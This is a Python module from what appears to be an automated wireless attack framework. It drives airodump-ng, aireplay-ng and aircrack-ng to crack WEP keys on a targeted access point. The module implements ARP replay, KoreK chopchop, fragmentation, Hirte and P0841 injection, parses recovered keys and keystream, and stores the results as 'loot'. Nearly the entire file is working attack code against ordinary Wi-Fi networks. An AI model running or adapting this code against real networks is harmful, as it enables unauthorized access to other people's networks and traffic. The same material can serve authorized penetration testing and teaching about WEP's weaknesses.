"""WEP: the IV harvest, plus the injection techniques that enable it.

WEP is broken in two separate ways, and the attacks here mirror that.  RC4's key
schedule leaks the key once enough distinct IVs are seen (ARP-replay harvesting, the
P0841 trick), and the IV space is small enough that ``aireplay-ng`` can decrypt or
forge individual packets without the key at all (chopchop, fragmentation, Hirte).
The second group is what makes the first possible on a quiet network: an attacker who
cannot inject cannot generate IVs.
"""

from __future__ import annotations

import contextlib
import os
import re
import time
from pathlib import Path
from typing import List, Optional

from ..deps import registry
from ..models import STATUS_FAILED, STATUS_SUCCESS, AccessPoint, Attempt, Capture
from ..util import Process, human_duration, mac_norm, run
from .base import Attack, AttackContext, AttackOutcome

KEY_FOUND_RE = re.compile(r"KEY FOUND!\s*\[?\s*(.*?)\s*\]?\s*$", re.M)
IVS_RE = re.compile(r"#Data:\s*(\d+)")
#: aireplay-ng names the file it saves recovered keystream in
KEYSTREAM_RE = re.compile(r"Saving keystream in ([^\s]+\.xor)", re.I)


def keystream_file(lines: List[str], prefix: str = "") -> str:
    """The keystream file aireplay-ng announced, if it announced one."""
    for line in reversed(lines[-200:]):
        match = KEYSTREAM_RE.search(line)
        if match:
            candidate = match.group(1).strip()
            if os.path.exists(candidate):
                return candidate
            # aireplay writes relative to its cwd; try next to our artifacts too
            alternative = os.path.join(os.path.dirname(prefix) or ".", candidate)
            if os.path.exists(alternative):
                return alternative
            return candidate
    return ""


class WepAttack(Attack):
    """The IV harvest, and the injection techniques that make it possible.

    Four of the five WEP attacks here are *enablers*: chopchop and fragmentation
    recover keystream for one packet, the client-oriented variant does the same
    against a single client's traffic.  They exist because a WEP network with no ARP
    traffic produces almost no IVs, and an attacker who cannot inject cannot harvest.
    Only ARP replay and the P0841 trick generate traffic on their own, so only those
    two can reach the key on their own.
    """

    name = "wep_ivs"
    label = "WEP IV harvesting"
    tool = "airodump-ng + aireplay-ng --arpreplay"
    description = ("Legacy but still occasionally deployed. Capture the WEP IVs and "
                   "let aircrack-ng recover the key as soon as enough frames exist.")
    requires = ("airodump",)
    applies_to = ("WEP",)
    #: what aireplay-ng is asked to do
    aireplay_args: tuple = ("--arpreplay",)
    #: does aireplay-ng need a client MAC (``-h``) to work?
    uses_client = True
    #: one line for the operator, and for the attempt record
    technique = "ARP replay"
    #: does this technique generate traffic by itself, or only make injection possible?
    reaches_key = True
    #: demo-mode IVs per step (an enabler recovers keystream instead)
    demo_ivs = (2400, 3000)
    demo_keystream = 0

    def applies(self, ap: AccessPoint) -> bool:
        return ap.encryption == "WEP"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool, chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if ctx.demo:
            return self._run_demo(ctx, ap, attempt)
        return self._run_live(ctx, ap, attempt)

    # -- the enabler path: keystream, not the key ------------------------ #
    def _keystream_success(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                           path: str, keystream: int, simulated: bool) -> AttackOutcome:
        """Finish an enabler: it recovered keystream, not the key."""
        detail = (f"{self.technique}: {keystream:,} bytes of keystream recovered"
                  + (" (simulated)" if simulated else "")
                  + " — injection is now possible, so the IV harvest can run")
        ctx.bus.log(f"{self.technique} succeeded on {ap.display_name}: {detail}",
                    level="success")
        ctx.session.stats.wep_enablers += 1
        ap.remember("wep_enabler", detail, technique=self.technique)
        saved = ""
        if path and os.path.exists(path):
            saved = ctx.session.save_artifact(path, "wep", ctx.loot_name(ap, "wep"))
        capture = Capture(kind="wep_ivs", bssid=ap.bssid, essid=ap.essid, path=saved,
                          valid=bool(saved), tool=f"aireplay-ng ({self.technique})",
                          extra={"keystream_bytes": keystream,
                                 "enables": "wep_ivs", "simulated": simulated})
        if saved:
            ctx.session.add_capture(capture)
        attempt.extra.update({"keystream_bytes": keystream, "enables": "wep_ivs",
                              "technique": self.technique})
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, "keystream recovered", detail)
        return AttackOutcome.success("keystream recovered", detail=detail,
                                     extra={"keystream_bytes": keystream,
                                            "enables": "wep_ivs",
                                            "next": "wep_ivs"})

    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = min(ctx.config.attack_timeout_for(self.name), 45)
        deadline = time.time() + timeout
        if not self.reaches_key:
            step = 0
            while time.time() < deadline and not ctx.want_stop():
                step += 1
                ctx.progress(f"{self.technique} against {ap.display_name}",
                             kind="capture", bssid=ap.bssid, percent=min(95, step * 30),
                             detail="recovering keystream (simulated)")
                time.sleep(0.4)
                if step >= 3:
                    path = ctx.artifact_path("wep", ap, ".xor")
                    try:
                        with open(path, "wb") as handle:
                            handle.write(bytes((index * 7 + 1) % 256
                                               for index in range(self.demo_keystream)))
                    except OSError:                        # pragma: no cover
                        path = ""
                    return self._keystream_success(ctx, ap, attempt, path,
                                                   self.demo_keystream, True)
            return self._fail(ctx, attempt, f"{self.technique} did not complete",
                              "no keystream recovered in the simulation window")
        ivs = 0
        while time.time() < deadline and not ctx.want_stop():
            ivs += self.demo_ivs[0] + int(time.time() * 7) % self.demo_ivs[1]
            ctx.progress(f"harvesting WEP IVs from {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=min(95, ivs / 30000 * 100),
                         detail=f"{ivs:,} IVs · {self.technique} (simulated)")
            ctx.bus.publish("capture.progress", {
                "label": f"IVs {ivs}", "kind": "wep", "bssid": ap.bssid,
                "value": ivs, "percent": min(95, ivs / 30000 * 100),
            })
            if ivs > 20000 or (ctx.radio.wep_ok(ap.bssid) and ivs > 8000):
                outcome = ctx.radio.crack(ap.bssid, kind="wep")
                password = outcome.get("password", "")
                if not password:
                    # aircrack-ng ran and did not find it (in the simulation that is
                    # the rare miss): keep harvesting IVs rather than reporting a key
                    # that does not exist
                    ctx.bus.log(f"aircrack-ng found no WEP key at {ivs:,} IVs "
                                f"(simulated: {outcome.get('reason', 'no key')}) — "
                                f"continuing the harvest", level="warning")
                    time.sleep(0.8)
                    continue
                capture = Capture(kind="wep_ivs", bssid=ap.bssid, essid=ap.essid, path="",
                                  valid=True, tool="aircrack-ng (simulated)",
                                  password=password, crack_tool="aircrack-ng",
                                  extra={"ivs": ivs, "simulated": True})
                ctx.session.stats.wep_cracks += 1
                ctx.session.add_capture(capture)
                ctx.session.end_attempt(attempt, STATUS_SUCCESS, f"WEP key {password}", "", capture)
                ctx.bus.log(f"WEP key recovered for {ap.display_name}: {password} "
                            f"(simulated, {ivs:,} IVs)", level="success")
                return AttackOutcome.success(f"WEP key {password}", capture, f"{ivs} IVs")
            time.sleep(0.8)
        return self._fail(ctx, attempt, "not enough IVs",
                          f"{ivs} IVs harvested (needs ~20k for a 104-bit key)")

    def _aireplay_command(self, ctx: AttackContext, ap: AccessPoint, client: str) -> List[str]:
        """The aireplay-ng invocation for this technique."""
        aireplay = registry.path("aireplay-ng") or "aireplay-ng"
        args = [aireplay, *self.aireplay_args, "-b", ap.bssid]
        if self.uses_client and client:
            args += ["-h", client]
        args += ["--ignore-negative-one", ctx.monitor]
        return args

    def _run_enabler_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                          timeout: float) -> AttackOutcome:
        """chopchop / fragmentation / hirte: keystream, then the harvest."""
        aireplay = registry.path("aireplay-ng")
        if not aireplay:
            return self._fail(ctx, attempt, "aireplay-ng missing", "install aircrack-ng")
        client = next(iter(ap.clients.values())).mac if ap.clients else ""
        if client:
            ctx.bus.log(f"{self.technique} using client {client} (it must send traffic)",
                        level="info")
        else:
            ctx.bus.log(f"{self.technique} without a known client: aireplay will "
                        f"discover one", level="warning")
        prefix = ctx.artifact_path("wep", ap, "-enabler")
        args = self._aireplay_command(ctx, ap, client)
        proc = Process(args, name="aireplay-ng", echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, f"could not start {self.technique}", proc.error)
        started = time.time()
        keystream_path = ""
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(1.0)
                ctx.progress(f"{self.technique} against {ap.display_name}",
                             kind="capture", bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / timeout * 100),
                             detail="aireplay-ng running (injection, no capture)")
                keystream_path = keystream_file(proc.lines, prefix) or keystream_path
                if keystream_path:
                    break
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
        if not keystream_path:
            tail = (proc.lines[-1][:120] if proc.lines else "no output")
            return self._fail(
                ctx, attempt, f"{self.technique} did not complete",
                f"{human_duration(time.time() - started)}: {tail} — this technique "
                f"needs a client sending traffic and a working injection test "
                f"(`aireplay-ng -9`)")
        size = os.path.getsize(keystream_path) if os.path.exists(keystream_path) else 0
        return self._keystream_success(ctx, ap, attempt, keystream_path, size, False)

    def _run_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = ctx.config.attack_timeout_for(self.name)
        airodump = registry.path("airodump-ng")
        aireplay = registry.path("aireplay-ng")
        if not airodump:
            return self._fail(ctx, attempt, "airodump-ng missing", "install aircrack-ng")
        if not self.reaches_key:
            return self._run_enabler_live(ctx, ap, attempt, min(timeout, 180.0))
        channel = ap.channel or 1
        ctx.set_channel(channel)
        prefix = ctx.artifact_path("wep", ap, "")
        cap_path = prefix + "-01.cap"
        args = [airodump, ctx.monitor, "-c", str(channel), "--bssid", ap.bssid,
                "-w", prefix, "--output-format", "pcap,csv", "--write-interval", "1",
                "--ivs", "--ignore-negative-one"]
        dump = Process(args, name="airodump-ng", echo_lines=ctx.config.verbose_tools)
        dump.start()
        if dump.error:
            return self._fail(ctx, attempt, "airodump-ng failed", dump.error)

        replay: Optional[Process] = None
        started = time.time()
        key = ""
        ivs = 0
        try:
            # ARP replay needs an associated client MAC (or a fake-auth)
            client = ""
            for candidate in ap.clients.values():
                client = candidate.mac
                break
            if aireplay and client:
                replay = Process(self._aireplay_command(ctx, ap, client),
                                 name="aireplay-ng", echo_lines=ctx.config.verbose_tools)
                replay.start()
                ctx.bus.log(f"{self.technique} started using client {client}", level="info")
            else:
                ctx.bus.log("no client known: passive IV capture only (slower)", level="warning")

            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(2.0)
                if os.path.exists(cap_path):
                    from ..pcap import analyze_file
                    analysis = analyze_file(cap_path, max_packets=120000)
                    ivs = max(ivs, analysis.wep_data)
                    ctx.progress(f"harvesting WEP IVs from {ap.display_name}", kind="capture",
                                 bssid=ap.bssid, percent=min(95, ivs / 30000 * 100),
                                 detail=f"{ivs:,} IVs captured")
                if ivs > 5000 or time.time() - started > timeout * 0.5:
                    cracker = registry.path("aircrack-ng")
                    if cracker and os.path.exists(cap_path):
                        result = run([cracker, "-b", ap.bssid, cap_path], timeout=90)
                        match = KEY_FOUND_RE.search(result.text)
                        if match:
                            key = match.group(1).strip()
                            break
        finally:
            for proc in (replay, dump):
                if proc is not None:
                    with contextlib.suppress(Exception):
                        proc.stop()

        if key:
            capture = Capture(kind="wep_ivs", bssid=ap.bssid, essid=ap.essid, path=cap_path,
                              valid=True, tool="aircrack-ng", password=key,
                              crack_tool="aircrack-ng", extra={"ivs": ivs})
            saved = ctx.session.save_artifact(cap_path, "wep", ctx.loot_name(ap, "wep"))
            capture.path = saved
            ctx.session.stats.wep_cracks += 1
            ctx.session.add_capture(capture)
            ctx.session.end_attempt(attempt, STATUS_SUCCESS, f"WEP key {key}", "", capture)
            ctx.bus.log(f"WEP key recovered for {ap.display_name}: {key}", level="success")
            return AttackOutcome.success(f"WEP key {key}", capture, f"{ivs} IVs")
        return self._fail(ctx, attempt, "not enough IVs for a WEP crack",
                          f"{ivs} IVs harvested in {human_duration(timeout)}")


# --------------------------------------------------------------------------- #
# the injection techniques that make the harvest possible
# --------------------------------------------------------------------------- #


class WepChopchopAttack(WepAttack):
    """KoreK chopchop: decrypt one packet without knowing the key."""

    name = "wep_chopchop"
    label = "WEP chopchop"
    tool = "aireplay-ng -4 (KoreK chopchop)"
    description = ("Truncates an encrypted packet byte by byte and watches the AP's "
                   "reaction to recover the keystream for it.  No client is needed and "
                   "nothing has to be known beforehand; the result is injection "
                   "capability, not the key.")
    technique = "chopchop"
    aireplay_args = ("-4",)
    uses_client = False
    reaches_key = False
    demo_keystream = 1500


class WepFragmentAttack(WepAttack):
    """Fragmentation attack: keystream via a fragmented, replayed packet."""

    name = "wep_fragment"
    label = "WEP fragmentation"
    tool = "aireplay-ng -5 (fragmentation)"
    description = ("Sends a fragmented copy of a captured packet and reassembles the "
                   "keystream from the AP's responses.  Faster than chopchop and the "
                   "usual predecessor of an ARP-replay harvest.")
    technique = "fragmentation"
    aireplay_args = ("-5",)
    uses_client = False
    reaches_key = False
    demo_keystream = 1500


class WepHirteAttack(WepAttack):
    """Client-oriented fragmentation (Hirte): keystream from a client, not the AP."""

    name = "wep_hirte"
    label = "WEP Hirte (client fragmentation)"
    tool = "aireplay-ng -7 (client-oriented fragmentation)"
    description = ("The client-oriented variant of the fragmentation attack: it needs "
                   "an associated client that is sending traffic, and produces "
                   "keystream when the AP itself is not answering.")
    technique = "client fragmentation (Hirte)"
    aireplay_args = ("-7",)
    reaches_key = False
    demo_keystream = 1500


class WepP0841Attack(WepAttack):
    """P0841: generate ARP traffic with a crafted request, then harvest."""

    name = "wep_p0841"
    label = "WEP P0841 (injected ARP)"
    tool = "aireplay-ng -2 -p 0841"
    description = ("Replays a crafted ARP request as a broadcast (the P0841 trick), so "
                   "the AP answers with fresh IVs even on a network where no client is "
                   "talking.  Like ARP replay it can reach the key on its own; unlike "
                   "it, it works without a captured ARP packet.")
    technique = "P0841 injected ARP"
    aireplay_args = ("-2", "-p", "0841", "-c", "ff:ff:ff:ff:ff:ff")
    uses_client = True
    reaches_key = True
    demo_ivs = (3000, 3500)
